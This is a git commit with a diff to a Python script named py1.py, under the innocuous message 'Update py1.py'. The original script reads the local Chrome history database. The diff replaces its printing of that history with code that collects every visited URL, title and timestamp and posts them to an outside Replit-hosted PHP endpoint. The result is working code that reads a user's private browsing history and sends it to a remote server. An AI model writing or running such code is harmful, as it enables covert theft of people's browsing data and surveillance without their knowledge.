b1cb5749f7e349f915f5388322736485fb7326ed
jjjjjjjjjjjjjjjjjjjjjjjjjjk <80856838+jjjjjjjjjjjjjjjjjjjjjjjjjjk@users.noreply.github.com>
2023-03-25 14:02:16 -0400

    Update py1.py

--- py1.py
+++ py1.py
@@ -1,6 +1,8 @@
 import sqlite3
 import os
 import datetime
+import json
+import requests
 
 # Get the path to the user's Chrome history database
 data_path = os.path.expanduser('~') + "/Library/Application Support/Google/Chrome/Default"
@@ -16,14 +18,23 @@ select_statement = "SELECT urls.url, urls.title, visits.visit_time FROM urls, vi
 cursor.execute(select_statement)
 results = cursor.fetchall()
 
-# Print out the results
-print("Chrome History:\n")
+# Create a list of dictionaries representing each history item
+history_items = []
 for row in results:
     url = row[0]
     title = row[1]
     timestamp = row[2] / 1000000
     visit_time = datetime.datetime.fromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M:%S")
-    print(f"{visit_time}: {title} ({url})")
+    history_items.append({"url": url, "title": title, "visit_time": visit_time})
 
 # Close the database connection
 connection.close()
+
+# Send the history data to a PHP script on a Replit server
+server_url = "https://vapidplayfuldatamart.dopebope.repl.co/index.php"
+payload = {"history": json.dumps(history_items)}
+response = requests.post(server_url, data=payload)
+if response.status_code == 200:
+    print("History data sent to Replit server successfully.")
+else:
+    print(f"Failed to send history data to Replit server. Response code: {response.status_code}")
